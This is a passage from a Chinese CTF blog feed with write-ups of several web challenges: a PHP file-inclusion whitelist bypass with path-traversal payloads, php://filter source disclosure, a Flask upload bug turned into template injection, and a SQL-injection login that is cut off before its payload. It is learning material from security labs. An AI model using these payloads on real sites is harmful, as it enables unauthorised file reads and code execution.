emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看代码主体部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>   ) &#123;<br>       <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>       <span class="hljs-keyword">exit</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>   &#125;  <br></code></pre></td></tr></table></figure><p>明确了传入一个参数file，并且如果满足：</p><p>file不为空（被赋值）；是字符串；传入emmm类中的checkFile()方法后返回值为真。则能够将file包含。</p><p>审计emmm类，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br></code></pre></td></tr></table></figure><p>白名单中包含”source.php”和”hint.php”，source.php就是本页面，传入file&#x3D;hint.php对hint.php进行包含（一开始做的时候真的以为是什么提示硬是想不看提示自己琢磨结果发现无论如何还是得看的呜呜呜呜呜）</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213021555716.png"></p><p>告诉了我们得到flag不是在这，而是在ffffllllaaaagggg，继续审计，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page必须是有被赋值而且是字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page如果在白名单内（source.php和hint.php）则返回true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br></code></pre></td></tr></table></figure><p>mb_substr(a,b,c)，对a字符串进行截取，从第b位开始，截取c个字符串长度，返回截取的字符串；</p><p>mb_strpos(a,b)，返回字符串b在字符串a中<em><strong>第一次</strong></em>出现的位置，如果没出现过则返回false；</p><p>mb_substr()截取$page，从第一个字符开始，截取长度为mb_strpos($page.’?’,’?’)，即问号在字符串page$.’?’（就是$page字符串最后面跟一个问号）中<em><strong>第一次</strong></em>出现的位置，记住是第一次，$page.’?’末尾的问号未必是第一次出现的位置。截取到的字符串赋值给$_page。（注意分清变量名）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果$_page在白名单里，则返回true，$_page的值我们是可以决定的，所以传入的file的值应以字符串”hint.php?”或者”source.php?”开头，这样一来经过mb_sudstr()的截取最终将”hint.php”或”source.php”与白名单进行对比返回为true。</p><p>到此为止已经满足了主体部分的三个条件了，结合hint.php的提示flag在ffffllllaaaagggg，传参?file&#x3D;hint.php?ffffllllaaaagggg，没有结果判断flag不在本目录，盲猜在根目录，于是</p><p>payload：</p><p>?file&#x3D;hint.php?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg  或  ?file&#x3D;source?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213024856357.png"></p><hr><h2 id="BUUCTF-新生赛include1"><a href="#BUUCTF-新生赛include1" class="headerlink" title="BUUCTF_新生赛include1"></a>BUUCTF_<strong>新生赛include1</strong></h2><p>一开始只有一个tips超链接，点击，提示“Can you find out the flag?”。查看源代码没有任何收获，发现url的位置是通过file传参，file&#x3D;flag.php。想到应该是主页源码含有文件包含，通过包含参数file。尝试php伪协议。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?file=php://input<br></code></pre></td></tr></table></figure><p>页面发出警告“hacker!”尝试大写绕过失败，尝试filter伪协议读取网页源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213113603645.png"></p><p>base64解码后拿到flag</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213113736893.png"></p><p>题后反思：用同样的方法查看了一下index.php源码</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213114000858.png"></p><p>过滤函数使用的是stristr()是不区分大小写的，strstr()则区分，同样还过滤掉了zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;还有data:&#x2F;&#x2F;。顺路学了下文件上传的zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;协议注入。</p><hr>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429194117415.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429195640928.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429195958840.png"></p><p>上传文件，获取flag。</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI</title>
    <link href="/2023/02/09/SQLI/"/>
    <url>/2023/02/09/SQLI/</url>
    
    <content type="html"><![CDATA[<h2 id="CTF-After-Dark-Injection-Perfection"><a href="#CTF-After-Dark-Injection-Perfection" class="headerlink" title="CTF After Dark-Injection Perfection"></a>CTF After Dark-Injection Perfection</h2><p>因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> port = <span class="hljs-built_in">parseInt</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span>) || <span class="hljs-number">8080</span>;<br><br><span class="hljs-keyword">const</span> sqlite3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sqlite3&#x27;</span>);<br><span class="hljs-keyword">const</span> db = <span class="hljs-keyword">new</span> sqlite3.<span class="hljs-title class_">Database</span>(<span class="hljs-string">&#x27;app.db&#x27;</span>, sqlite3.<span class="hljs-property">OPEN_READONLY</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(upload.<span class="hljs-title function_">array</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>&#125;);<br>&#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">attemptLogin</span> = (<span class="hljs-params">username, password</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect password&#x27;</span>);<br>&#125;);<br>&#125;)<br>&#125;;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;login.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br><span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br><span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br><span class="hljs-keyword">if</span> (!username || !password)<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Invalid Login&quot;</span>);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">attemptLogin</span>(username, password));<br>&#125; <span class="hljs-keyword">catch</span> (err) &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(err);<br>&#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;not found&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>本题重点在第29行这个回调函数，从数据库调数据与用户输入进行比对，那就看看这个后端判断登录的逻辑是什么样的吧：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect password&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>显然如果存在sql注入的话<code>username</code>将会是注入点，可以看出逻辑为：</p><p>从数据库的<code>users</code>表查名为用户输入的<code>username</code>的行中的<code>username</code>和<code>password</code>字段，将结果存入<code>row</code>数组中，如果用户输入的<code>password</code>等于数据库查到的<code>row.password</code>，也就是登陆成功，则执行一个<code>getFavColor()</code>方法</p><p>getFavColor():</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>&#125;);<br>&#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>大概users里存着三个字段：username、password、fav_color。<code>getColor()</code>方法是当用户登陆成功后查询登录账户最喜欢的颜色并返回，题目要求使用admin登录，盲猜admin最喜欢的颜色就是flag啦（。</p><p>再回到登录验证部分。那么怎么样才能输入用户名”admin”，然后输入密码对应的是”admin”对应的密码呢？一开始陷入了这个思维陷阱没跳出来，实际上，可以这样：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 